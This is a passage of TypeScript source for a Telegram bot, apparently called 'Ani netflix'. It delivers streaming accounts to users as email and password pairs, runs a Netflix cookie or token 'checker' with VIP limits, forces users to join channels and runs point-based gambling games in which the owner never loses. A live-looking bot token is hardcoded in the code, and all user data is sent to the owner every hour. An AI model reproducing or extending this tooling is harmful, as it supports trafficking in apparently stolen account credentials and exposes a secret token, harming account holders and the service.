// @ts-nocheck
import TelegramBot from "node-telegram-bot-api";
import { storage } from "./storage";
import crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import AdmZip from "adm-zip";

export function setupBot() {
  const token = process.env.TELEGRAM_BOT_TOKEN || "8608932927:AAHDhSuwcoqcn3ChpqxZ0hwEuAOdUQL1u5E";
  if (!token) {
    console.log("❌ No TELEGRAM_BOT_TOKEN found. Bot is disabled.");
    return;
  }

  console.log("🤖 Initializing Telegram Bot...");

  process.on("uncaughtException", (err) => {
    console.error("❌ Uncaught Exception:", err.message);
  });
  process.on("unhandledRejection", (err: any) => {
    console.error("❌ Unhandled Rejection:", err?.message || err);
  });

  const _bot = new TelegramBot(token, {
    polling: {
      autoStart: true,
      params: { timeout: 10 },
      interval: 100,
    },
  });

  const EMOJI_MAP: Record<string, string> = {
    "✅": "5427009714745517609",
    "❌": "4974566529661142011",
    "⛔": "5852477713482255786",
    "🎉": "5461151367559141950",
    "📂": "6017174676898321263",
    "🔑": "5330115548900501467",
    "🔐": "5472308992514464048",
    "🎫": "6084925952041687533",
    "💡": "5472146462362048818",
    "➕": "6032733629719777782",
    "🗂": "5431736674147114227",
    "📈": "5278775094687058205",
    "🗑": "5445267414562389170",
    "📝": "5846014758364386016",
    "📡": "5877641725006057409",
    "👤": "4967667085606912536",
    "🛠": "5462921117423384478",
    "📸": "6231107453178611892",
    "⭐": "6084507909989866387",
    "⚠️": "4974320144567239752",
    "🔔": "5922749584672559397",
    "💀": "5418367003595391262",
    "😏": "5240142636953640660",
    "🔸": "5972165824817925650",
    "😀": "5372954454653933911",
    "📢": "5780405967527089720",
    "👇": "5470177992950946662",
    "🔓": "4974606326828107003",
    "👑": "5769547529993588669",
    "📊": "5398052521249881872",
    "💰": "5922478782689579227",
    "🎰": "6082221527099513145",
    "🎁": "5199749070830197566",
    "🎲": "5879623757923881824",
    "🏆": "5409008750893734809",
    "💎": "6084472820107057290",
    "🪙": "6257781003973038401",
    "📦": "5463172695132745432",
    "🛒": "5431499171045581032",
    "🔄": "5345783284653636765",
    "❓": "5467666648263564704",
    "🆘": "5235442052946212776",
    "✉️": "5253742260054409879",
    "🤖": "5372981976804366741",
    "🏷": "6017174676898321263",
    "🔗": "5345783284653636765",
    "🎯": "5409008750893734809",
    "🚫": "5215371279929976844",
    "💲": "5922478782689579227",
    "🎮": "5879623757923881824",
    "🎡": "6082221527099513145",
    "💸": "5922478782689579227",
    "📖": "5846014758364386016",
    "🔙": "5345783284653636765",
    "📋": "5846014758364386016",
    "⏱": "5345783284653636765",
    "💾": "5463172695132745432",
    "👥": "4967667085606912536",
    "🎟️": "6084925952041687533",
    "🎟": "6084925952041687533",
    "⏰": "4967525849902350972",
    "⏳": "5454415424319931791",
    "♾": "6298717844804733009",
    "⚡": "5373066076558996568",
    "⚽": "5298562580250387121",
    "✂️": "5269616738353300957",
    "✏️": "5370951118698339120",
    "✨": "5987715818337603766",
    "❗": "4956368164817470478",
    "➖": "5215635927224820367",
    "➡": "6100510464213519966",
    "🌟": "4974382692175971463",
    "🍀": "5433875443306481415",
    "🍒": "5415722218569089767",
    "🏀": "5346072890003439893",
    "🏁": "5348445120700102867",
    "🏅": "4974325947068056590",
    "🏇": "5397686650165812340",
    "👉": "5463392464314315076",
    "👐": "5253784475287967979",
    "💥": "4972406912730530826",
    "💬": "5213307977640979750",
    "💳": "5213403875670765022",
    "📄": "5931718859366075705",
    "📅": "5413879192267805083",
    "📌": "5215578413317758112",
    "📞": "5032882092367675986",
    "📤": "5445355530111437729",
    "📥": "5215324073944423501",
    "📧": "5303416490295304868",
    "📩": "5454113432284446338",
    "📭": "5388894010297303730",
    "🔢": "5226929552319594190",
    "🔥": "5780864206177834457",
    "🔧": "5462921117423384478",
    "🔫": "5235534102685294861",
    "🔴": "4974595911532413987",
    "🔹": "6035010168545087745",
    "🕐": "5215484787325676090",
    "🗺": "5192907870827467960",
    "😢": "5463137996091962323",
    "🚀": "5372917041193828849",
    "🚨": "5213178248153803519",
    "🛍️": "5377660214096974712",
    "🛍": "5377660214096974712",
    "🥅": "5301135772466826929",
    "🥇": "5440539497383087970",
    "🥈": "5447203607294265305",
    "🥉": "5453902265922376865",
    "🥊": "5231406626228948265",
    "🪨": "5269640498112378277",
    "🆕": "5368324170671202286",
    "🆔": "5226929552319594190",
    "🟢": "5357635070214498450",
    "🤩": "5373126106729696326",
    "🤑": "5368541083733563552",
    "😎": "5372947630364818998",
    "🎵": "5373153597900675498",
    "🙏": "5368324170671202287",
    "🔒": "5897604269141398480",
    "📣": "5780405967527089720",
    "🎪": "5226711870492126219",
    "🏠": "5463172695132745432",
    "⬅": "5352759161945867747",
    "🔝": "5372917041193828849",
    "⭐️": "5415796104891483565",
    "❤️‍🔥": "5431375892599291902",
    "🎓": "5375163339154399459",
    "🦅": "5345862999246663238",
    "✊": "5472404692975753822",
    "🌩": "5282731554135615450",
    "🌪": "5017230363957658643",
    "🌪️": "5017230363957658643",
    "🔘": "5870461759457857056",
    "👊": "5956131513606082626",
    "🛡": "5363972600001216334",
    "♥️": "5348576757152759323",
    "♥": "5348576757152759323",
    "✋": "5956190921593721347",
    "📁": "5257969839313526622",
    "🌍": "5371023536141902128",
    "🟡": "6023695996326778608",
    "🤝": "5963304821954974384",
    "🤔": "5960886386000138444",
    "😬": "5956109643632612120",
    "🟩": "5929506753640141421",
    "🟥": "6023604715386837309",
    "📨": "5406631276042002796",
    "🔍": "5429571366384842791",
    "🖤": "5373230968943420212",
    "❤️": "6084659067068880426",
    "❤": "6084659067068880426",
  };

  const EMOJI_MAP_SORTED = Object.entries(EMOJI_MAP).sort((a, b) => b[0].length - a[0].length);
  function ce(text: string): string {
    for (const [emoji, id] of EMOJI_MAP_SORTED) {
      text = text.replaceAll(emoji, `<tg-emoji emoji-id="${id}">${emoji}</tg-emoji>`);
    }
    return text;
  }

  function stripCe(text: string): string {
    return text.replace(/<tg-emoji emoji-id="[^"]*">([^<]*)<\/tg-emoji>/g, '$1');
  }

  const bot = _bot;

  function escHtml(text: string): string {
    return text.replace(/&(?!amp;|lt;|gt;|quot;|#\d+;)/g, '&amp;').replace(/<(?!\/?(?:b|i|u|s|a|code|pre|tg-emoji|tg-spoiler|blockquote|span)\b)/gi, '&lt;');
  }

  const _origSend = bot.sendMessage.bind(bot);
  bot.sendMessage = (chatId: any, text: string, options?: any) => {
    if (!options) options = {};
    const origText = text;
    const origParse = options.parse_mode;
    if (!options.parse_mode) {
      text = escHtml(text);
      options.parse_mode = "HTML";
    }
    if (options.parse_mode === "HTML") text = ce(text);
    return _origSend(chatId, text, options).catch((err: any) => {
      console.error("[EMOJI-SEND] Retry1:", err.message?.substring(0, 100));
      return _origSend(chatId, stripCe(text), options).catch((err2: any) => {
        console.error("[EMOJI-SEND] Retry2:", err2.message?.substring(0, 100));
        const fallbackOpts = origParse ? { ...options, parse_mode: origParse } : (() => { const o = { ...options }; delete o.parse_mode; return o; })();
        return _origSend(chatId, origText, fallbackOpts);
      });
    });
  };

  const _origEdit = bot.editMessageText.bind(bot);
  bot.editMessageText = (text: string, options?: any) => {
    if (!options) options = {};
    const origText = text;
    const origParse = options.parse_mode;
    if (!options.parse_mode) {
      text = escHtml(text);
      options.parse_mode = "HTML";
    }
    if (options.parse_mode === "HTML") text = ce(text);
    return _origEdit(text, options).catch((err: any) => {
      console.error("[EMOJI-EDIT] Retry1:", err.message?.substring(0, 100));
      return _origEdit(stripCe(text), options).catch((err2: any) => {
        console.error("[EMOJI-EDIT] Retry2:", err2.message?.substring(0, 100));
        const fallbackOpts = origParse ? { ...options, parse_mode: origParse } : (() => { const o = { ...options }; delete o.parse_mode; return o; })();
        return _origEdit(origText, fallbackOpts);
      });
    });
  };

  const _origSendDoc = bot.sendDocument.bind(bot);
  bot.sendDocument = (chatId: any, doc: any, options?: any, fileOptions?: any) => {
    if (!options) options = {};
    const origCaption = options.caption;
    if (!options.parse_mode) options.parse_mode = "HTML";
    if (options.caption) options.caption = ce(options.caption);
    return _origSendDoc(chatId, doc, options, fileOptions).catch(() => {
      if (origCaption) options.caption = origCaption;
      return _origSendDoc(chatId, doc, options, fileOptions);
    });
  };

  const _origSendPhoto = bot.sendPhoto.bind(bot);
  bot.sendPhoto = (chatId: any, photo: any, options?: any, fileOptions?: any) => {
    if (!options) options = {};
    const origCaption = options.caption;
    if (!options.parse_mode) options.parse_mode = "HTML";
    if (options.caption) options.caption = ce(options.caption);
    return _origSendPhoto(chatId, photo, options, fileOptions).catch(() => {
      if (origCaption) options.caption = origCaption;
      return _origSendPhoto(chatId, photo, options, fileOptions);
    });
  };

  const OWNER_ID = "7606499525";
  const OWNER_IDS = ["7606499525", "8550198013"];
  let BOT_USERNAME = (process.env.BOT_USERNAME || "").replace("@", "");
  let OWNER_USERNAME = "";
  const SCREENSHOT_CHANNEL = process.env.SCREENSHOT_CHANNEL || "@proofsnetfliz";

  let isGameEnabled = false;
  let isDailySpinEnabled = true;
  let isGiveawayEnabled = false;
  let isShopLocked = false;
  let isCheckerLocked = false;
  let isTransferLocked = false;
  let customWelcomeMessage = "";

  const LOGS_FILE = ".data/activity_logs.json";
  interface ActivityLog {
    type: string;
    username: string;
    telegramId: string;
    details: string;
    timestamp: string;
  }
  let activityLogs: ActivityLog[] = [];

  const loadActivityLogs = () => {
    try {
      if (fs.existsSync(LOGS_FILE)) {
        activityLogs = JSON.parse(fs.readFileSync(LOGS_FILE, "utf8"));
      }
    } catch { activityLogs = []; }
  };

  const saveActivityLogs = () => {
    try {
      const dir = ".data";
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      if (activityLogs.length > 500) activityLogs = activityLogs.slice(-500);
      fs.writeFileSync(LOGS_FILE, JSON.stringify(activityLogs, null, 2));
    } catch {}
  };

  const addLog = (type: string, username: string, telegramId: string, details: string) => {
    activityLogs.push({ type, username, telegramId, details, timestamp: new Date().toISOString() });
    saveActivityLogs();
  };

  loadActivityLogs();

  interface VipChecker {
    telegramId: string;
    username: string;
    expiresAt: number | null;
    grantedBy: string;
    grantedAt: number;
  }
  let vipCheckers: VipChecker[] = [];
  const VIP_FILE = ".data/vip_checkers.json";
  const MAX_COOKIES_NORMAL = 50;

  const loadVipCheckers = () => {
    try {
      if (fs.existsSync(VIP_FILE)) {
        vipCheckers = JSON.parse(fs.readFileSync(VIP_FILE, "utf8"));
        vipCheckers = vipCheckers.filter(v => !v.expiresAt || v.expiresAt > Date.now());
      }
    } catch { vipCheckers = []; }
  };

  const saveVipCheckers = () => {
    try {
      const dir = ".data";
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(VIP_FILE, JSON.stringify(vipCheckers, null, 2));
    } catch {}
  };

  const isVipChecker = (telegramId: string): boolean => {
    loadVipCheckers();
    const v = vipCheckers.find(x => x.telegramId === telegramId);
    if (!v) return false;
    if (v.expiresAt && v.expiresAt < Date.now()) {
      vipCheckers = vipCheckers.filter(x => x.telegramId !== telegramId);
      saveVipCheckers();
      return false;
    }
    return true;
  };

  const getVipInfo = (telegramId: string): VipChecker | undefined => {
    loadVipCheckers();
    return vipCheckers.find(x => x.telegramId === telegramId);
  };

  const loadGameState = () => {
    try {
      const configPath = ".data/config.json";
      if (fs.existsSync(configPath)) {
        const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
        isGameEnabled = config.isGameEnabled === true;
        isDailySpinEnabled = config.isDailySpinEnabled !== false;
        isGiveawayEnabled = config.isGiveawayEnabled === true;
        isShopLocked = config.isShopLocked === true;
        isCheckerLocked = config.isCheckerLocked === true;
        isTransferLocked = config.isTransferLocked === true;
        customWelcomeMessage = config.customWelcomeMessage || "";
      }
    } catch (err: any) {
      console.log("Could not load config, starting with games disabled");
    }
  };

  const saveGameState = () => {
    try {
      const dir = ".data";
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(dir + "/config.json", JSON.stringify({ isGameEnabled, isDailySpinEnabled, isGiveawayEnabled, isShopLocked, isCheckerLocked, isTransferLocked, customWelcomeMessage }, null, 2));
    } catch (err: any) {
      console.error("Failed to save game state:", err.message);
    }
  };

  loadGameState();
  loadVipCheckers();

  bot.getMe().then(me => {
    BOT_USERNAME = me.username || BOT_USERNAME;
    console.log(`✅ Bot username: @${BOT_USERNAME}`);
    bot.setMyCommands([
      { command: "start", description: "Start the bot" },
      { command: "support", description: "Contact support team" },
      { command: "redeem", description: "Redeem a code" },
      { command: "animatrix", description: "Redeem Animatrix account" },
      { command: "cancel", description: "Cancel current action" },
      { command: "admin", description: "Admin panel (admins only)" },
    ]).then(() => {
      console.log("✅ Bot commands set successfully");
    }).catch(() => {});
    if (SCREENSHOT_CHANNEL) {
      bot.getChat(SCREENSHOT_CHANNEL).then((chat: any) => {
        console.log(`✅ Proofs channel verified: ${chat.title || SCREENSHOT_CHANNEL}`);
      }).catch((err: any) => {
        console.error(`❌ Cannot access proofs channel ${SCREENSHOT_CHANNEL}: ${err.message}`);
        console.error("   Make sure the bot is added as ADMIN to the channel!");
      });
    }
  }).catch(() => {
    console.log("⚠️ Could not fetch bot username");
  });

  async function restoreBotName() {
    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/setMyName`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: "Ani netflix" }),
      });
      const data = await res.json() as any;
      if (data.ok) {
        console.log("✅ Bot name restored to: Ani netflix");
      } else if (data.parameters?.retry_after) {
        const secs = data.parameters.retry_after;
        console.log(`⏳ Name change rate limited, retrying in ${secs}s...`);
        setTimeout(restoreBotName, (secs + 5) * 1000);
      }
    } catch {}
  }
  setTimeout(restoreBotName, 5000);

  let CHANNELS: string[] = [
    "https://t.me/animatrix2026",
    "https://t.me/+esAvaRd-9npjYzFk",
    "https://t.me/netflixhivea",
    "https://t.me/proofsnetfliz",
    "https://t.me/ThunderVault8",
  ];

  const CHANNELS_FILE = ".data/channels.json";
  const loadChannels = () => {
    try {
      if (fs.existsSync(CHANNELS_FILE)) {
        CHANNELS = JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf8"));
      }
    } catch {}
  };
  const saveChannels = () => {
    try {
      const dir = ".data";
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(CHANNELS_FILE, JSON.stringify(CHANNELS, null, 2));
    } catch {}
  };
  loadChannels();

  if (OWNER_ID) {
    bot.getChat(OWNER_ID).then(chat => {
      OWNER_USERNAME = (chat as any).username || "";
      console.log(`✅ Owner username: @${OWNER_USERNAME}`);
    }).catch(() => {
      console.log("⚠️ Could not fetch owner username");
    });
  }

  console.log(`📢 Screenshot Channel: ${SCREENSHOT_CHANNEL || "Not set"}`);

  async function sendSourceBackupToOwner() {
    if (!OWNER_ID) return;
    const sourceFiles = ["src/bot.ts", "src/storage.ts", "src/index.ts"];
    let fileContent = `BOT SOURCE CODE BACKUP — ${new Date().toISOString()}\n${"═".repeat(60)}\n\n`;
    let foundAny = false;
    for (const filePath of sourceFiles) {
      const fullPath = path.join(process.cwd(), filePath);
      if (fs.existsSync(fullPath)) {
        foundAny = true;
        const content = fs.readFileSync(fullPath, "utf-8");
        fileContent += `${"═".repeat(60)}\nFILE: ${filePath}\n${"═".repeat(60)}\n\n${content}\n\n`;
      } else {
        fileContent += `[FILE NOT FOUND: ${fullPath}]\n\n`;
      }
    }
    const tmpFile = path.join("/tmp", `backup_source_${Date.now()}.txt`);
    fs.writeFileSync(tmpFile, fileContent, "utf-8");
    try {
      await bot.sendDocument(OWNER_ID, tmpFile, {
        caption: `📂 Auto Backup\n📅 ${new Date().toLocaleString()}\n📄 Files: ${sourceFiles.length}`,
        parse_mode: "HTML",
      });
      console.log("✅ Auto backup sent to owner");
    } catch (err) {
      console.error("❌ Failed to send auto backup:", err);
    }
    try { fs.unlinkSync(tmpFile); } catch {}
  }

  async function sendDataBackupToOwner() {
    if (!OWNER_ID) return;
    try {
      const dataDir = path.join(process.cwd(), ".data");
      if (!fs.existsSync(dataDir)) return;
      const tmpFile = path.join("/tmp", `unified_backup_${Date.now()}.json`);
      const files = fs.readdirSync(dataDir);
      const unifiedBackup: any = { timestamp: new Date().toISOString(), version: "1.0", data: {} };
      for (const file of files) {
        if (file.endsWith(".json")) {
          const content = fs.readFileSync(path.join(dataDir, file), "utf-8");
          try { unifiedBackup.data[file] = JSON.parse(content); } catch (e) {}
        }
      }
      fs.writeFileSync(tmpFile, JSON.stringify(unifiedBackup, null, 2), "utf-8");
      await bot.sendDocument(OWNER_ID, tmpFile, {
        caption: `📦✨⚡🔐\n💾 Data Backup\n📅 ${new Date().toLocaleString()}\n👥 All data saved`,
        parse_mode: "HTML",
      });
      try { fs.unlinkSync(tmpFile); } catch {}
      const allUsers = await storage.getAllUsers();
      if (allUsers.length > 0) {
        let textContent = "👤 Users & Points Backup\n" + "═".repeat(40) + "\n\n";
        let totalPoints = 0;
        allUsers.forEach((u: any) => {
          textContent += `ID: ${u.telegramId} | User: @${u.username || "none"} | Points: ${u.points || 0} | Game Points: ${u.gamePoints || 0}\n`;
          totalPoints += (u.points || 0);
        });
        textContent += `\n\n📊 Total Users: ${allUsers.length}\n💰 Total Points: ${totalPoints}\n`;
        const txtFile = path.join("/tmp", `users_points_${Date.now()}.txt`);
        fs.writeFileSync(txtFile, textContent, "utf-8");
        await bot.sendDocument(OWNER_ID, txtFile, {
          caption: `📊 <b>Users & Points Summary</b>\n📅 ${new Date().toLocaleString()}`,
          parse_mode: "HTML",
        });
        try { fs.unlinkSync(txtFile); } catch {}
      }
    } catch (err) {
      console.error("❌ Failed to send data backup:", err);
    }
  }

  setInterval(() => { sendSourceBackupToOwner(); }, 60 * 60 * 1000);
  setInterval(() => { sendDataBackupToOwner(); }, 60 * 60 * 1000);
  setTimeout(() => { sendSourceBackupToOwner(); }, 5000);
  setTimeout(() => { sendDataBackupToOwner(); }, 8000);

  console.log(`📢 Channels to check: ${CHANNELS.length}`);
  CHANNELS.forEach((ch, i) => console.log(`  Channel ${i + 1}: ${ch}`));

  function esc(text: string): string {
    if (!text) return "";
    return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  function formatDeliveryMessage(code: string, itemName: string): string {
    const parts = code.split("|");
    const ownerTag = OWNER_USERNAME ? `@${OWNER_USERNAME}` : "the admin";
    if (parts.length >= 2) {
      const [email, password, country, plan] = parts.map(p => p.trim());
      let msg = `🛒 Order Successfully Completed..\n\n`;
      msg += `📧 Email: ${esc(email)}\n`;
      msg += `🔐 Password: ${esc(password)}\n`;
      if (country) msg += `🗺 Country: ${esc(country)}\n`;
      if (plan) msg += `🎫 Plan: ${esc(plan)}\n`;
      msg += `\nLogin and send screenshot to ${ownerTag}`;
      return msg;
    }
    return `🛒 Order Successfully Completed..\n\n📦 Your Account:\n${esc(code)}\n\nSend screenshot to ${ownerTag}`;
  }

  const uncheckableChannels = new Set<string>();

  async function isMember(channelId: string, userId: number): Promise<boolean> {
    try {
      if (channelId.includes("/+")) {
        uncheckableChannels.add(channelId);
        return true;
      }
      let chatId = channelId.trim();
      if (chatId.startsWith("https://t.me/")) {
        const m = chatId.match(/t\.me\/([^+/][^/]*)/);
        if (m) chatId = "@" + m[1];
      } else if (chatId.startsWith("t.me/")) {
        const m = chatId.match(/t\.me\/([^+/][^/]*)/);
        if (m) chatId = "@" + m[1];
      } else if (!chatId.startsWith("@") && !chatId.startsWith("-")) {
        chatId = "@" + chatId;
      }
      const member = await bot.getChatMember(chatId, userId);
      uncheckableChannels.delete(channelId);
      return ["creator", "administrator", "member"].includes(member.status);
    } catch (err: any) {
      if (err.message?.includes("member list is inaccessible") || err.message?.includes("chat not found")) {
        console.error(`⚠️ Bot is NOT admin in ${channelId} — add bot as admin to enable forced sub!`);
        uncheckableChannels.add(channelId);
        return true;
      }
      if (err.message?.includes("user not found") || err.message?.includes("USER_NOT_PARTICIPANT")) {
        return false;
      }
      console.error(`Membership check failed for ${channelId}:`, err.message);
      return true;
    }
  }

  async function checkAllChannels(userId: number): Promise<boolean> {
    for (const ch of CHANNELS) {
      if (!await isMember(ch, userId)) return false;
    }
    return true;
  }

  async function getUnjoinedChannels(userId: number): Promise<string[]> {
    const notJoined: string[] = [];
    for (const ch of CHANNELS) {
      if (uncheckableChannels.has(ch) || ch.includes("/+")) {
        notJoined.push(ch);
        continue;
      }
      const joined = await isMember(ch, userId);
      if (!joined) notJoined.push(ch);
    }
    return notJoined;
  }

  async function isAdminOrOwner(telegramId: string | number): Promise<boolean> {
    const tid = String(telegramId);
    if (OWNER_IDS.includes(tid)) return true;
    return await storage.isAdmin(tid);
  }

  function isBotOwner(telegramId: string | number): boolean {
    return OWNER_IDS.includes(String(telegramId));
  }

  function getChannelUrl(ch: string): string {
    ch = ch.trim();
    if (ch.startsWith("https://") || ch.startsWith("http://")) return ch;
    if (ch.startsWith("t.me/")) return "https://" + ch;
    if (ch.startsWith("@")) return `https://t.me/${ch.slice(1)}`;
    return `https://t.me/${ch}`;
  }

  function getChannelName(ch: string): string {
    ch = ch.trim();
    if (ch.includes("/+")) return "Private Channel";
    const m = ch.match(/t\.me\/([^/]+)$/);
    if (m) return "@" + m[1];
    if (ch.startsWith("@")) return ch;
    return ch;
  }

  async function joinChannelsMsgForUser(userId: number): Promise<{ text: string; opts: TelegramBot.SendMessageOptions }> {
    const notJoined = await getUnjoinedChannels(userId);
    if (notJoined.length === 0) notJoined.push(...CHANNELS);
    let channelList = "";
    notJoined.forEach((ch, i) => {
      const name = getChannelName(ch);
      const url = getChannelUrl(ch);
      channelList += `${i + 1}. <a href="${url}">${esc(name)}</a>\n`;
    });
    const text =
      `🔐 <b>Access Locked!</b>\n` +
      `${"─".repeat(30)}\n\n` +
      `⚠️ You must join all our channels to use this bot.\n\n` +
      `📢 <b>Channels you need to join:</b>\n${channelList}\n` +
      `✅ After joining, tap the button below to verify.`;
    const rows: TelegramBot.InlineKeyboardButton[][] = [];
    notJoined.forEach((ch, i) => {
      rows.push([{ text: `📢 Join Channel ${i + 1}`, url: getChannelUrl(ch) }]);
    });
    rows.push([{ text: "✅ I've Joined All Channels", callback_data: "check_sub" }]);
    return { text, opts: { parse_mode: "HTML", disable_web_page_preview: true, reply_markup: { inline_keyboard: rows } } };
  }

  function userMenu(isAdmin = false): TelegramBot.SendMessageOptions {
    const keyboard: TelegramBot.KeyboardButton[][] = [
      [{ text: "💰 Balance" }, { text: "👥 Referral" }],
      [{ text: "🎟️ Redeem Code" }, { text: "💲 Withdraw" }],
      [{ text: "🎮 Games 🎮" }, { text: "📊 Statistics" }],
      [{ text: "🎡 Daily Spin" }, { text: "💸 Transfer" }],
      [{ text: "🎰 Lottery" }, { text: "🔑 NF Checker" }],
      [{ text: "🎁 Giveaway" }, { text: "🏆 Top Referrals" }],
      [{ text: "⭐ Rate Us" }, { text: "📞 Support" }],
    ];
    if (isAdmin) keyboard.push([{ text: "🔐 Admin Panel" }]);
    return {
      parse_mode: "HTML",
      reply_markup: { keyboard, resize_keyboard: true, one_time_keyboard: false },
    };
  }

  function adminMenu(): TelegramBot.SendMessageOptions {
    return {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          [{ text: "👥 Users" }, { text: "🛍️ Items" }],
          [{ text: "➕ Add Points" }, { text: "➖ Remove Points" }],
          [{ text: "🚫 Ban User" }, { text: "✅ Unban User" }],
          [{ text: "📦 Add Stock" }, { text: "🗑 Delete Stock" }],
          [{ text: "🎟️ Redeem Codes" }, { text: "📊 Bot Stats" }],
          [{ text: "📈 Advanced Stats" }],
          [{ text: "👑 Admins" }, { text: "📢 Broadcast" }],
          [{ text: "🎮 Game Control" }, { text: "🎡 Spin Control" }],
          [{ text: "💾 Backup" }],
          [{ text: "⚠️ Warn User" }, { text: "⏱ Temp Ban" }],
          [{ text: "🎁 Gift All" }, { text: "🎰 Lottery Control" }],
          [{ text: "🎁 Giveaway Control" }],
          [{ text: "🎫 Animatrix" }],
          [{ text: "🔑 NF Token Checker" }, { text: "👑 VIP Checker" }],
          [{ text: "📢 Channels" }],
          [{ text: "🔄 Reset All Points" }],
          [{ text: "⭐ Account Ratings" }],
          [{ text: "🔒 Lock Controls" }, { text: "💬 Welcome Message" }],
          [{ text: "🔔 Stock Alert" }, { text: "📋 Activity Logs" }],
          [{ text: "📖 Admin Help" }],
          [{ text: "🔙 User Menu" }],
        ],
        resize_keyboard: true,
      },
    };
  }

  const pending: Record<number, { action: string; data?: any }> = {};
  const ratingPending: Record<number, { rating: number; feedback?: string }> = {};
  const nfCheckStopped: Set<number> = new Set();
  const waitingScreenshot: Record<number, { itemName: string; username: string; itemId?: string; source?: "store" | "animatrix" }> = {};
  const lotteryPool: { odId: number; username: string; ticketCount: number }[] = [];
  let lotteryActive = false;
  let lotteryPrize = 1;

  interface GiveawayData {
    active: boolean;
    endTime: number;
    requiredReferrals: number;
    participants: { odId: number; username: string }[];
    timer?: NodeJS.Timeout;
  }
  let giveaway: GiveawayData = { active: false, endTime: 0, requiredReferrals: 0, participants: [] };
  const startCache: Record<number, string | null> = {};

  const rateLimit = new Map<number, number>();
  const spamWarnings = new Map<number, number>();
  const tempBans = new Map<number, number>();

  const gameState: Record<number, { gameType: string; betAmount: number; choice?: string; step?: string }> = {};

  async function deductBet(user: any, betAmount: number): Promise<boolean> {
    const isOwnerPlayer = String(user.telegramId) === OWNER_ID;
    if (isOwnerPlayer) return true;
    if (((user.points || 0) + (user.gamePoints || 0)) < betAmount) return false;
    let remaining = betAmount;
    if ((user.gamePoints || 0) >= remaining) {
      await storage.deductGamePoints(user.id, remaining);
    } else {
      const gp = user.gamePoints || 0;
      const p = remaining - gp;
      if (gp > 0) await storage.deductGamePoints(user.id, gp);
      if (p > 0) await storage.deductPoints(user.id, p);
    }
    return true;
  }

  function getWinConfig(betAmount: number) {
    if (betAmount === 3) return { chance: 0.35, multiplier: 2 };
    if (betAmount === 5) return { chance: 0.30, multiplier: 2.4 };
    return { chance: 0.40, multiplier: 2 };
  }

  async function resolveGameResult(chatId: number, userId: number, gameType: string, betAmount: number, won: boolean, gameVisual: string) {
    try {
      const user = await storage.getUserByTelegramId(String(userId));
      if (!user) return;
      const isOwnerPlayer = isBotOwner(userId);
      const { multiplier } = getWinConfig(betAmount);
      const winAmount = Math.floor(betAmount * multiplier);

      await storage.incrementGamesPlayed(user.id);

      let resultMsg = "";
      if (won) {
        await storage.incrementGamesWon(user.id);
        if (!isOwnerPlayer) await storage.addGamePoints(user.id, winAmount);
        const updatedUser = await storage.getUserByTelegramId(String(userId));
        const gpDisplay = isOwnerPlayer ? "∞" : String(updatedUser?.gamePoints || 0);
        resultMsg =
          `🎮 🎉 YOU WON! 🎉\n${"─".repeat(30)}\n\n` +
          `${gameVisual}\n\n` +
          `💰 Bet: ${betAmount} pts\n` +
          `🏆 Prize: +${winAmount} game points\n` +
          `💳 Balance: ${gpDisplay} game points\n\n` +
          `✨ Congratulations!`;
      } else {
        const updatedUser = await storage.getUserByTelegramId(String(userId));
        const gpDisplay = isOwnerPlayer ? "∞" : String(updatedUser?.gamePoints || 0);
        resultMsg =
          `🎮 😢 YOU LOST 😢\n${"─".repeat(30)}\n\n` +
          `${gameVisual}\n\n` +
          `💰 Bet: ${betAmount} pts\n` +
          `💳 Balance: ${gpDisplay} game points\n\n` +
          `🍀 Try again!`;
      }

      await bot.sendMessage(chatId, resultMsg, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔄 Play Again", callback_data: `play:${gameType}:${betAmount}` }],
            [{ text: "🔙 Back to Games", callback_data: "game_back" }],
          ],
        },
      });

      addLog("game", user.username, String(userId), `${gameType} | Bet: ${betAmount} | ${won ? `WON +${winAmount}` : `LOST -${betAmount}`}`);

      if (OWNER_ID) {
        const gameNotif =
          `🎮 Game (${gameType})\n👤 @${esc(user.username)} | ${won ? "WON 🎉" : "LOST 😢"}\n💰 Bet: ${betAmount} | ${won ? `+${winAmount}` : `-${betAmount}`}`;
        try { await bot.sendMessage(OWNER_ID, gameNotif, { parse_mode: "HTML" }); } catch {}
      }
    } catch (err: any) {
      console.error("Game resolve error:", err.message);
    }
  }

  async function startInteractiveGame(chatId: number, userId: number, gameType: string, betAmount: number) {
    try {
      const user = await storage.getUserByTelegramId(String(userId));
      if (!user) return bot.sendMessage(chatId, "Please use /start first.");
      const isOwnerPlayer = isBotOwner(userId);

      if (!isOwnerPlayer && ((user.points || 0) + (user.gamePoints || 0)) < betAmount) {
        return bot.sendMessage(chatId,
          `❌ Insufficient Points!\n\n💰 General: ${user.points || 0}\n🎮 Game: ${user.gamePoints || 0}\n\nYou need ${betAmount} to play. Invite friends to earn more!`,
          { parse_mode: "HTML" }
        );
      }

      if (gameType === "rps") {
        gameState[userId] = { gameType, betAmount };
        return bot.sendMessage(chatId,
          `✊ Rock Paper Scissors\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\nChoose your move:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🪨 Rock", callback_data: `gc:rps:rock:${betAmount}` },
                  { text: "📄 Paper", callback_data: `gc:rps:paper:${betAmount}` },
                  { text: "✂️ Scissors", callback_data: `gc:rps:scissors:${betAmount}` },
                ],
                [{ text: "❌ Cancel", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (gameType === "coin") {
        gameState[userId] = { gameType, betAmount };
        return bot.sendMessage(chatId,
          `🪙 Coin Flip\n${"─".repeat(30)}\n\n💰 Bet: ${betAmount} pts\n\nCall it! Heads or Tails?`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
